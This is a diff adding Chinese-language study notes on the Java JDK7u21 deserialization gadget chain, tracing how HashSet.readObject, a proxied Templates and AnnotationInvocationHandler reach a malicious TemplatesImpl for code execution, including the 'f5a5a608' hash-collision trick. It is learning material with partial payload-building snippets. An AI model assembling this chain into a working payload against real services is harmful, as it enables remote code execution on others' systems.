@@ -303,5 +303,187 @@ public class annotationInvocationHandler {
     }
 }
 ```
+
+这里我们可以注意到，在实例化AnnotationInvocationHandler时，传进入的是Templates.class：
+```java
+Object ahObject = constructor.newInstance(Templates.class, new HashMap<String, Object>());
+```
+而不是TamplatesImpl.class，为什么？原因在于equalsImpl会调用所有方法，如果是TemplatesImpl，那么newTransformer/getOutputProperties的索引分别是13和14，压根执行不到这里就会报错退出了。而Templates只有两个方法，分别是newTransformer和getOutputProperties，这两个方法无论执行哪个都能rce。
+
 完整代码见于：`annotationInvocationHander.java`  
+
+# `invoke` -> `equalsImpl`
+
+上面讲到AnnotationInvocationHandler.equalsImpl可以链接TemplatesImpl.getOutputProperties，那么问题来了，谁调用了equalsImpl呢？
+
+当我们打开AnnotationInvocationHandler.invoke方法，就会发现这样一段代码：
+```java
+public Object invoke(Object var1, Method var2, Object[] var3) { // var1是被代理对象，var2是被调用的方法，var3是方法参数列表
+    String var4 = var2.getName();
+    Class[] var5 = var2.getParameterTypes();
+    if (var4.equals("equals") && var5.length == 1 && var5[0] == Object.class) { // 当被调用的方法名为equals，且该方法仅接受一个Object类型的参数时，符合if条件，步入
+        return this.equalsImpl(var3[0]);  // 这里调用了equalsImpl，var3[0]如果是恶意TemplatesImpl对象，则能够代码执行
+    } else {
+        ....
+    }
+}
+```
+invoke方法在CC1中已经见过，当一个类被AnnotationInvocationHandler代理，那么他的任何方法调用都会先进入invoke方法。那么现在只要找到一个类，他在反序列化时会自动调用equals方法，我们只要对他进行动态代理，那么他执行equals方法时自然会进入AnnotationInvocationHandler.invoke方法，然后再调用equalsImpl，巴拉巴拉。  
+
+# HashSet
+
+HashSet的readObject代码如下：
+```java
+private void readObject(java.io.ObjectInputStream s)
+    throws java.io.IOException, ClassNotFoundException {
+    // Read in any hidden serialization magic
+    s.defaultReadObject();
+
+    // Read in HashMap capacity and load factor and create backing HashMap
+    int capacity = s.readInt();
+    float loadFactor = s.readFloat();
+    map = (((HashSet)this) instanceof LinkedHashSet ?
+            new LinkedHashMap<E,Object>(capacity, loadFactor) :
+            new HashMap<E,Object>(capacity, loadFactor));
+
+    // Read in size
+    int size = s.readInt();
+
+    // Read in all elements in the proper order.
+    for (int i=0; i<size; i++) { // 枚举HashSet每一个数据，一个个反序列化，然后调用map.put，这个map无非是HashMap或LinkedHashMap
+        E e = (E) s.readObject();
+        map.put(e, PRESENT); // 跟进，PRESENT就是个空的Object对象
+    }
+}
+```
+跟进map.put：
+```java
+public V put(K key, V value) {
+    if (key == null)
+        return putForNullKey(value);
+    int hash = hash(key);  // 计算key的hash
+    int i = indexFor(hash, table.length);
+    for (Entry<K,V> e = table[i]; e != null; e = e.next) { // 判断当前key的hash是否已经在Set中了，如果是，则步入，并从Set中取出具有相同hash的e
+        Object k;
+        if (e.hash == hash && ((k = e.key) == key || key.equals(k))) { // 如果e与key的hash完全相同，且e与key相同，则步入，此时调用key的equals方法，值得注意的是，这里传入的参数为k，所以我们的恶意TemplatesImpl对象放在k中
+            V oldValue = e.value;
+            e.value = value;
+            e.recordAccess(this);
+            return oldValue;
+        }
+    }
+
+    modCount++;
+    addEntry(hash, key, value, i);
+    return null;
+}
+```
+由于Set是不可以重复的，因此HashSet在反序列化时，依次对每一个值反序列化，然后放入HashMap，为了保证值不重复，就需要在每次放入HashMap前检查是否已经存过相同的数据了，如何定义两个数据是否相同呢？HastSet通过对数值本身以及其hashcode是否完全相同的二维方式来判断。
+
+上面put方法中的：`if (e.hash == hash && ((k = e.key) == key || key.equals(k)))`就是用来做这个二维判断的。
+
+key应该是Templates类型，这样的话，当他被AnnotationInvocationHandler代理以后，其equals的调用，会自动进入AnnotationInvocationHandler.invoke方法。这一点很好解决。
+
+但考虑到HashSet中必须有至少两个元素的hashcode相同，才会进行这个二维判断，由于我们需要往HashSet中填入数据类似如下：
+```java
+HashSet hashSet = new HashSet();
+hashSet.add(templates);  // 被代理的Templates
+hashSet.add(new templatesImpl().getTmpl());  // 恶意TemplatesImpl对象
+```
+因此本质上，我们需要保证被代理的Templates与恶意TemplatesImpl对象的hashCode值相等。
+
+HashMap中计算hashCode主要是依靠hash方法，跟进看下：
+```java
+final int hash(Object k) {
+    int h = 0;
+    if (useAltHashing) {
+        if (k instanceof String) {
+            return sun.misc.Hashing.stringHash32((String) k);
+        }
+        h = hashSeed;
+    }
+
+    h ^= k.hashCode();
+
+    // This function ensures that hashCodes that differ only by
+    // constant multiples at each bit position have a bounded
+    // number of collisions (approximately 8 at default load factor).
+    h ^= (h >>> 20) ^ (h >>> 12);
+    return h ^ (h >>> 7) ^ (h >>> 4);
+}
+```
+主要是做了亦或和无符号右移这些操作，其核心在于k.hashCode。
+
+经过调试我发现，由于TemplatesImpl没有实现hashCode方法，所以大概率在计算hashCode时，调用的是Object.hashCode方法，由于这个方式是native修饰的，我们看不到实现，且每次计算的结果不一样。比如我先后两次调试，计算出的hashCode分别是：1217519979、768178162。理论上，我们无法预测TemplatesImpl对象的hashCode值，所以只能寄希望于被劫持的Templates。
+
+由于Templates被劫持了，所以现在我们来看AnnotationInvocationHandler的invoke方法：
+```java
+else if (var4.equals("hashCode")) {
+    return this.hashCodeImpl();
+```
+因此，hashMap计算被劫持的Templates的hashCode时，其实是调用的AnnotationInvocationHandler.hashCodeImpl，跟进：
+```java
+private int hashCodeImpl() {
+    int var1 = 0;
+
+    Map.Entry var3;
+    for(Iterator var2 = this.memberValues.entrySet().iterator(); var2.hasNext(); var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) {
+        var3 = (Map.Entry)var2.next();
+    }
+
+    return var1;
+}
+```
+核心就是：
+```java
+for(
+    Iterator var2 = this.memberValues.entrySet().iterator(); 
+    var2.hasNext(); 
+    var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())
+    ) {
+        var3 = (Map.Entry)var2.next();
+    }
+```
+这是在遍历this.memberValues，先给var2初始化，然后通过hasNext()判断是否有数据，如果有，则步入代码块，通过next对var3进行赋值，然后取key计算hashCode与value的hashCode进行亦或，然后将结果给到var1，接着继续循环，最后return var1，var1就是hashCode。看起来有点复杂。不过我们可以简化。
+
+首先，我们可以设定this.memberValues的长度为1，于是for循环就不存在了，其代码逻辑实际上就变成了：
+```java
+Map.Entry var3 = (Map.Entry) this.memberValues.entrySet().iterator().next(); 
+
+var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())
+```
+
+我们来看下memberValuehashCode部分代码：
+```java
+private static int memberValueHashCode(Object var0) {
+    Class var1 = var0.getClass();
+    if (!var1.isArray()) {
+        return var0.hashCode();
+    }...
+}
+```
+所以上面代码还可以简化成：
+```java
+127 * ((String)var3.getKey()).hashCode() ^ var3.getValue().hashCode();
+```
+
+经过测试，笔者发现虽然每次TemplatesImpl对象的hashCode方法执行结果都不同，但在同一次程序运行中，同一个TemplatesImpl对象的hashCode方法多次运行返回结果却是一样的！
+因此，如果var3.getValue()与恶意TemplatesImpl为同一个TemplatesImpl对象，那么他们的hashCode也就完全相同，于是计算公式就变成了：
+```java
+127 * ((String)var3.getKey()).hashCode() ^ 恶意TemplatesImpl.hashCode() = 恶意TemplatesImpl.hashCode()
+```
+任何数，与0亦或，结果都是他自身，所以如果我们能让：127 * ((String)var3.getKey()).hashCode()为0，就可以完成HashMap的hashCode校验了。
+
+P牛写了个爆破程序：
+```java
+public static void bruteHashCode() {
+    for (long i = 0; i < 9999999999L; i++) {
+        if (Long.toHexString(i).hashCode() == 0) {
+            System.out.println("Found a value: " + i);
+            break; 
+        }
+    }
+}
+```
+结果为：`f5a5a608`，ysoserial用的就是这个。
 
